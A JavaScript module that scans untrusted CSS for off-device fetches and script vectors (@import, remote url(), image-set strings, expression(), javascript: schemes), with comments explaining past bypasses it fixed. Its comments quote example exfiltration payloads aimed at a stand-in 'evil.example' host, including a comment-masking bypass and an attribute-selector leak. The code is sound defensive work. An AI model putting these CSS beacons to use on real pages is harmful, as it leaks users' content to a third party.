/**
 * lib/core/css-scan.js — "does this stylesheet reach off the device?", answered once.
 *
 * The safety scanners two faculties need over UNTRUSTED CSS: `findCssExfil` (every
 * off-device or script-bearing construct) and `findCssImports` (every `@import` with
 * its target classified). Pure, `fs`-free, dependency-free apart from the canonical
 * comment walk, so both browser bundles hold it.
 *
 * WHY IT IS ITS OWN FILE. These were born inside `lib/layout/gate.js`, the COMPONENT
 * gate, which is the right home for everything else there — the manifest schema, the
 * selector-scoping walk, the skeleton rules. But `lib/theme/gate.js` needs exactly
 * these two and none of the rest, and reaching them through the component gate drags
 * a 41 KB JSON manifest schema and the whole component contract into the theme
 * browser bundle (measured: `theme-core.generated.js` 55.9 KB → 133.6 KB). A theme
 * gate that depends on the component faculty's schema is also just wrong about what
 * it is. Same move, same reason, as `lib/core/css-comments.mjs`: the shared answer
 * moves to where both sides can hold it (HARD RULE #15).
 *
 * ── COMMENTS ARE READ BY THE CANONICAL WALK, AND THAT IS A FIX ───────────────
 *
 * These scanners used to blank comments with `replace(/\/\*[\s\S]*?\*\//g, …)`, the
 * exact naive strip `lib/core/css-comments.mjs` exists to abolish, and it was a live
 * BYPASS rather than a tidiness point. Comments and strings are not independent
 * layers: a `/*` inside a string is not a comment, so the naive regex pairs it with
 * the next REAL closer and blanks everything between. Measured against the gate as
 * it shipped:
 *
 *     section.x::after { content: "/*" }
 *     @import url(https://evil.example/beacon.css);
 *     body { background: url(https://evil.example/leak) }
 *     /* harmless note *\/
 *
 * `gateCss(css, 'x')` returned **zero findings** — a remote `@import` and a remote
 * `url()` beacon, both invisible, in the gate that decides whether CSS reaches a
 * same-origin preview frame holding the user's BYOK key (HARD RULE #24). The walk
 * in `css-comments.mjs` tracks strings and unquoted `url(` runs, so the string's
 * `/*` is text and the two payloads are found.
 *
 * `maskCssComments` and not `stripCssComments`: masking blanks comments to spaces and
 * keeps newlines, so `result.length === css.length` and every offset still points at
 * the source byte it names.
 *
 * ── ESCAPES ARE DECODED FOR DETECTION AND MAPPED BACK FOR JUDGMENT ──────────
 *
 * A scanner that reads only the literal bytes misses `@imp\ort url(//evil)`, which
 * the BROWSER decodes and honors. So detection runs on the decoded text. But a
 * caller deciding whether some OTHER consumer will accept the same statement has to
 * judge the bytes that consumer will actually see — and `lib/theme/gate.js` learned
 * this the expensive way: it allowlisted a decoded target against a re-derived name
 * grammar, so `@import '\61 rdesia'` read as the registered theme `ardesia` and
 * passed, while the engine's resolver (which matches raw bytes) left it in place to
 * be hoisted into first position of the composed sheet as a live fetch.
 *
 * `decodeCssEscapesMapped` therefore returns the decoded text AND an index map back
 * to the source, so every finding carries `raw` — the exact source bytes of the
 * statement — and a `line` computed against the SOURCE rather than against the
 * shortened decoded copy.
 *
 * ── KNOWN LIMITATION, inherited and deliberate ──────────────────────────────
 *
 * These scan comment-blind but NOT string-blind: a decorative `content: "@import
 * url(x)"` is reported. Blanking strings is not available — it would also blank the
 * quoted `url("…")` targets `findCssExfil` must read. The failure direction is the
 * safe one (a false positive on a string nobody writes), and it is pinned by a test
 * rather than left to be rediscovered.
 */

const { maskCssComments } = require('./css-comments.mjs');

// CSS constructs that reach OFF the device or execute — an exfiltration / XSS
// channel a palette-blind component never needs, and the live hole #616 §5.1
// (T-CSS) calls out: a shared/AI component's CSS could `background:url(//evil/
// ?leak)` a beacon, or attribute-leak deck text selector-by-selector
// (`[value^="a"]{background:url(//evil/a)}`), with no script at all — defeating
// the on-device confidentiality goal. `expression()`, `-moz-binding`, and
// `javascript:`/`vbscript:` schemes are legacy script vectors. We block every
// REMOTE fetch but allow the two NON-network url() targets a designer legitimately
// needs: a `#fragment` ref (an SVG filter/clip in the same document) and an inline
// `data:` URI (an icon like the shipped agenda component's data-SVG — loaded by CSS
// in secure-static mode, it can neither script nor fetch). So the legit inline-icon
// pattern survives while every off-device request is denied.
const CSS_EXFIL_RULES = Object.freeze([
  { rule: 'css-import', re: /@import\b/gi, message: '@import fetches a remote stylesheet — not allowed (it can beacon out or load attacker CSS).' },
  { rule: 'css-expression', re: /\bexpression\s*\(/gi, message: 'CSS expression() executes script — not allowed.' },
  { rule: 'css-binding', re: /-moz-binding\b/gi, message: '-moz-binding binds script to an element — not allowed.' },
  { rule: 'css-scheme', re: /\b(?:javascript|vbscript)\s*:/gi, message: 'a javascript:/vbscript: URL is a script vector — not allowed.' },
]);
// url( "…" | '…' | …unquoted ) targets, and image-set( … )'s bare-string form (`image-set("//evil" 1x)`, which
// fetches WITHOUT a `url()` wrapper), are read by `findAddressStrings` below, over the shared CSS reader. They were
// first a regex whose lazy unquoted arm scanned to the end of the sheet from every `url(` with no `)` (10.9 s on
// `url(` × 50 000, in a scanner the Studio's CSS view runs on every keystroke), then a lazy regex to the first `)` that
// stopped at an earlier `url(data:…)` and missed `"//evil" 2x` after it (Chromium fetched it, 2026-10-19), then a
// hand-written walk (frozen in tools/segno-legacy/find-address-strings.js).
// "Is this string a NETWORK address?" (a scheme, `//`, or a backslash pair) is the policy table's, shared with the code
// door (lib/core/door-attr.mjs) and read by the security spine's census (content-policy.js `isAddressString`).
const { isAddressString } = require('./content-policy.js');

// The CSS reader both refusal readers here share with the renderer (remote-ref.js `cssRefSpans`), with the two facts
// this file needs: `image-set()` membership (lib/core/css-image-set-block.js) and the declaration channel (`decls`),
// which says which declaration or descriptor each string sits in (security spine P2).
const { makeCssRefSpans } = require('./css-ref-reader.js');
const { imageSetBlock } = require('./css-image-set-block.js');
const declSpans = makeCssRefSpans(require('./css-ref.generated.js'), require('./css-token-readers.js'), { imageSet: imageSetBlock, urlArg: true, decls: true });

/**
 * Comments blanked to spaces, newlines and offsets preserved — the canonical walk.
 * Exported because every scanner in `lib/layout/gate.js` needs the same answer, and
 * a second implementation there is what this file exists to prevent.
 */
function stripComments(css) {
  return maskCssComments(String(css || ''));
}

// The escape decoder lives in its own dependency-free module, because the ENGINE needs it
// (lib/engine/css.js) and none of these scanners: requiring this file pulled every scanner into
// the engine bundle on every route (measured 2026-10-19: +776 gzip bytes when the address walk
// landed, past getting-started's engine ceiling). Re-exported below, so this API is unchanged.
const { decodeCssEscapesMapped, decodeCssEscapes } = require('./css-escapes.js');

/**
 * A line-number lookup over one string, built once.
 *
 * The scanners here run `matchAll` and ask for a line per hit. Computing each one by
 * counting newlines from index 0 is O(n) per hit and O(n·m) per scan, which is fine
 * for a 450-line palette and is not fine for a paste: 20 000 `@import` statements
 * took **9.5 s** on this machine, in a scanner a live editor calls on every keystroke.
 * One forward pass plus a binary search per hit makes the same scan milliseconds.
 */
function lineIndexer(src) {
  const nl = [];
  for (let i = 0; i < src.length; i++) if (src[i] === '\n') nl.push(i);
  return (index) => {
    let lo = 0;
    let hi = nl.length;
    while (lo < hi) {
      const mid = (lo + hi) >> 1;
      if (nl[mid] < index) lo = mid + 1;
      else hi = mid;
    }
    return lo + 1;
  };
}

/** 1-based line number of a character offset. One-shot; use `lineIndexer` in a loop. */
function lineAt(text, index) {
  let n = 1;
  for (let i = 0; i < index && i < text.length; i++) if (text[i] === '\n') n++;
  return n;
}

/**
 * A url() target is on-device (safe) only if it's a same-document #fragment or an
 * inline data: URI — anything else is a network fetch.
 */
function urlIsLocal(raw) {
  let s = String(raw).trim();
  if ((s[0] === '"' && s.endsWith('"')) || (s[0] === "'" && s.endsWith("'"))) s = s.slice(1, -1);
  s = s.trim().toLowerCase();
  return s.startsWith('#') || s.startsWith('data:');
}

/**
 * Off-device / script-bearing CSS constructs (comments excluded): `@import`,
 * remote `url(...)`, `expression()`, `-moz-binding`, `javascript:`/`vbscript:`.
 * One finding per hit; `url(#frag)` and `url(data:…)` are on-device → not flagged.
 * Closes #616 §5.1 T-CSS (CSS exfiltration via a shared/AI component's styles).
 *
 * `line` is the SOURCE line. It used to be the line in the escape-decoded copy,
 * which is shorter, so a sheet carrying escapes reported a finding against the wrong
 * line — cosmetic, but a gate that points at the wrong line is one an author learns
 * to distrust.
 */
function findCssExfil(css) {
  // Mask comments first (so `@imp/**/ort` can't hide a keyword across a comment),
  // THEN decode CSS escapes (so `@imp\ort` / `\75rl(` can't either).
  const masked = stripComments(css);
  const { text: src, map } = decodeCssEscapesMapped(masked);
  const lineOfSource = lineIndexer(masked);
  const lineOf = (i) => lineOfSource(map[i] ?? masked.length);
  const out = [];
  for (const { rule, re, message } of CSS_EXFIL_RULES) {
    for (const m of src.matchAll(re)) out.push({ rule, message, line: lineOf(m.index) });
  }
  const remoteFinding = (target) => ({
    rule: 'css-url-remote',
    message: `url(${target}) fetches a remote resource — only inline data: URIs and #fragment refs are allowed (a remote url() can beacon deck content out).`,
  });
  // The bare-string channels, read from the SOURCE (the walk decodes escapes itself, and
  // the decoded copy turns `\"` into a quote that would end a string early).
  // image-set()'s bare-string targets (no url() wrapper) — a second remote channel.
  for (const a of findAddressStrings(masked)) {
    if (a.kind === 'url') {
      if (!urlIsLocal(a.value)) out.push({ ...remoteFinding(a.value), line: lineOfSource(a.index) });
    } else if (a.kind === 'image-set' || a.kind === 'function') {
      if (!urlIsLocal(a.value)) out.push({ ...remoteFinding(a.value), line: lineOfSource(a.index) });
    } else {
      out.push({
        rule: 'css-var-address', line: lineOfSource(a.index),
        message: `"${a.value}" is an address held in ${a.where}, and any \`image-set(var(…))\` that reads it fetches it — only inline data: URIs and #fragment refs are allowed.`,
      });
    }
  }
  return out;
}

/**
 * Every target and quoted string in a COMMENT-MASKED sheet that a browser may fetch, read by `cssRefSpans`
 * (the renderer's own CSS reader) with its declaration channel, so strings, escapes (`\2d-q` is `--q`), nested
 * functions and the declaration each string sits in mean what they mean to the browser (security spine P2; the walk this
 * replaced is frozen in tools/segno-legacy/find-address-strings.js, and
 * test/unit/core/css-decl-readers-differential.test.js holds the two together):
 *
 *   kind 'url'        every `url( … )` target, quoted (with its quotes) or not (escapes decoded;
 *                     a run with no closing `)` is cut at the end of the sheet, as CSS cuts it).
 *   kind 'image-set'  a bare string target anywhere inside `image-set()`, however deep
 *                     (not one inside `url()`, which is kind 'url', nor `type()`, a MIME type).
 *   kind 'function'   an ADDRESS-SHAPED string inside any other function (`image("//x")`), which a browser
 *                     may fetch where the function takes an image (found by the P2 oracle in three engines).
 *   kind 'var'        an ADDRESS-SHAPED string in a custom property's value or an
 *                     `@property` rule's `initial-value`. A string there is text until
 *                     something reads it where an address goes, and
 *                     `--q:"https://x/y"; background-image: image-set(var(--q) 1x)` fetches
 *                     it — on another rule, through inheritance, from any element (the red team,
 *                     2026-10-18; `engineering/decisions/2026-10-16-npm-plugin-threat-model.md §5.2`).
 *                     No look at the declaration can tell whether it will be read, so the
 *                     address shape is the test. A label (`--sep:"/"`, `--t:"10:30"`) is text.
 *
 * Each item is `{ kind, value, index, where? }`, `index` an offset into the input.
 */
function findAddressStrings(src) {
  const text = String(src ?? '');
  const out = [];
  for (const sp of declSpans(text)) {
    if (sp.selector) continue; // an attribute selector's string never fetches
    if (sp.kind === 'url' || sp.urlArg) {
      // A quoted target keeps its quotes, as callers have always printed it: `url("//x")`.
      const q = sp.kind === 'url' ? /^[^(]*\([ \t\n\r\f]*(["']?)/.exec(text.slice(sp.from, sp.to))[1] : text[sp.from];
      out.push({ kind: 'url', value: q ? `${q}${sp.value}${q}` : sp.value, index: sp.from });
    } else if (sp.imageSet) out.push({ kind: 'image-set', value: sp.value, index: sp.from });
    // An ADDRESS-SHAPED string in any other function: `src: image("//x")` in an `@font-face` fetched in Chromium, WebKit
    // and Firefox, and neither the old walk nor `url()` / `image-set()` named it (the P2 oracle, seed 7). The address
    // shape is the test, so `format("woff2")`, `type("image/png")` and `attr(x, "fallback")` stay text.
    else if (sp.inFunction && isAddressString(sp.value)) out.push({ kind: 'function', value: sp.value.trim(), index: sp.from });
    else if ((sp.decl.startsWith('--') || sp.decl === 'initial-value') && isAddressString(sp.value)) {
      out.push({ kind: 'var', value: sp.value.trim(), index: sp.from, where: sp.decl === 'initial-value' ? 'an `@property` initial-value' : `the custom property \`${sp.decl}\`` });
    }
  }
  return out;
}

// `@import` as a KEYWORD — the same token `CSS_EXFIL_RULES[0]` bans outright for a
// component. A theme cannot be held to that ban (every shipped palette opens with
// `@import 'lattice'`), so the theme gate needs to read each import's TARGET rather
// than only count the keyword. See `findCssImports` and `lib/theme/gate.js`.
const IMPORT_AT_RE = /@import\b/gi;
// A quoted string, the two forms an `@import` target may take. Unterminated → no
// match, which classifies the import as `other` and (in every caller here) rejects
// it: an author mid-keystroke is not a reason to certify a target nobody could read.
const IMPORT_STRING_RE = /^("(?:\\.|[^"\\])*"|'(?:\\.|[^'\\])*')/;
// `url( … )` at the head of an import body, quoted or bare — the same target capture the
// walk makes, on a statement already capped at MAX_IMPORT_STATEMENT, so it stays linear.
const IMPORT_URL_RE = /^url\(\s*("(?:\\.|[^"\\])*"|'(?:\\.|[^'\\])*'|[^)]*?)\s*\)/i;
/**
 * How far past `@import` the statement scan will look for a terminator.
 *
 * A malformed import — an unterminated quote, an unbalanced `(` — has no terminator
 * to find, so the scan runs to end-of-input, once per `@import` in the sheet. That is
 * quadratic on attacker-chosen bytes and it is synchronous in a browser tab:
 * `'@import "'.repeat(20000)` took **17 s**, measured, in a scanner the CSS view calls
 * on every keystroke and the `.zip` import path feeds untrusted bytes to.
 *
 * Capping it costs nothing real. A theme-name import is ~30 bytes; the longest thing
 * this needs to classify correctly is a `url(data:…)` target, which every caller
 * rejects anyway. Past the cap the statement is cut, which yields an unterminated —
 * therefore `other`, therefore rejected — classification: the safe direction.
 */
const MAX_IMPORT_STATEMENT = 4096;

/**
 * Split an `@import` body into its TARGET and the TAIL that follows it.
 *
 * `kind` is `'url'` (a `url(…)` target), `'string'` (a quoted target) or `'other'`
 * (anything else, including an unterminated string). `tail` is everything between
 * the target and the statement's end — a layer(), supports() or media-query
 * qualifier. It is reported rather than parsed because the engine's two theme-import
 * grammars (`THEME_IMPORT_RE` in lib/engine/css.js, `THEME_NAME_IMPORT_RE` in
 * lib/engine/themes.js) both end at the closing quote: an import carrying a tail
 * does NOT resolve against the theme registry, so a caller allowlisting registered
 * theme names has to see that the tail is there.
 */
function classifyImportTarget(body) {
  const rest = String(body).trimStart();
  const url = IMPORT_URL_RE.exec(rest);
  if (url) {
    let t = url[1].trim();
    if ((t[0] === '"' && t.endsWith('"')) || (t[0] === "'" && t.endsWith("'"))) t = t.slice(1, -1);
    return { kind: 'url', target: t.trim(), quote: '', tail: rest.slice(url[0].length).trim() };
  }
  const str = IMPORT_STRING_RE.exec(rest);
  if (str) {
    return { kind: 'string', target: str[1].slice(1, -1), quote: str[1][0], tail: rest.slice(str[0].length).trim() };
  }
  return { kind: 'other', target: rest.trim(), quote: '', tail: '' };
}

/**
 * Every `@import` statement in the CSS, with its target classified.
 *
 * DETECTION IS BROWSER-SHAPED: comments masked, escapes decoded, keyword matched
 * case-insensitively — so everything a browser would honor is found, including
 * `@imp\ort` and `@IMPORT`. JUDGMENT IS CALLER-SHAPED: each finding carries `raw`,
 * the exact SOURCE bytes of the statement, so a caller can decide against the bytes
 * whatever consumer it cares about will actually read. The two are different
 * questions and conflating them is how an escaped theme name passed a gate whose
 * whole purpose was to reject it (see the module header).
 *
 * The statement ends at the first top-level `;`, `{` or `}`, with strings and `()`
 * nesting transparent, so a `;` inside `url("a;b")` does not end it early — or at
 * `MAX_IMPORT_STATEMENT` bytes, whichever comes first.
 *
 * WHY THIS IS A PRIMITIVE AND NOT A RULE. For a component the answer is settled —
 * `CSS_EXFIL_RULES[0]` bans `@import` outright, because a component never needs
 * one. A THEME is the opposite: the import is how a palette inherits, it is in
 * 32 of 32 shipped themes, and it is the entire token content of 13 of them. So
 * the theme gate has to allowlist a target rather than ban a keyword, and this is
 * the reading that lets it. One finding per hit; NOTHING here decides policy.
 */
function findCssImports(css) {
  const masked = stripComments(css);
  const { text: src, map } = decodeCssEscapesMapped(masked);
  const lineOfSource = lineIndexer(masked);
  const srcAt = (i) => map[i] ?? masked.length;
  const out = [];
  for (const m of src.matchAll(IMPORT_AT_RE)) {
    const start = m.index;
    const limit = Math.min(src.length, start + MAX_IMPORT_STATEMENT);
    let i = start + m[0].length;
    let depth = 0;
    let quote = '';
    for (; i < limit; i++) {
      const ch = src[i];
      if (quote) {
        if (ch === '\\') i++;
        else if (ch === quote) quote = '';
        continue;
      }
      if (ch === '"' || ch === "'") { quote = ch; continue; }
      if (ch === '(' || ch === '[') depth++;
      // Clamped at zero for the same reason `splitSelectorList` clamps: an unbalanced
      // `)` mid-edit must not make every later `;` invisible, swallowing the rest of
      // the sheet into one import statement.
      else if (ch === ')' || ch === ']') depth = Math.max(0, depth - 1);
      else if (depth === 0 && (ch === ';' || ch === '{' || ch === '}')) break;
    }
    out.push({
      ...classifyImportTarget(src.slice(start + m[0].length, i)),
      line: lineOfSource(srcAt(start)),
      index: srcAt(start),
      // The SOURCE bytes, un-decoded — what any other consumer of this stylesheet
      // will read. `statement` is the decoded reading the classification came from.
      raw: masked.slice(srcAt(start), srcAt(i)).trim(),
      statement: src.slice(start, i).trim(),
    });
  }
  return out;
}

module.exports = {
  CSS_EXFIL_RULES,
  findAddressStrings,
  isAddressString,
  MAX_IMPORT_STATEMENT,
  stripComments,
  decodeCssEscapes,
  decodeCssEscapesMapped,
  lineAt,
  lineIndexer,
  urlIsLocal,
  findCssExfil,
  findCssImports,
  classifyImportTarget,
};
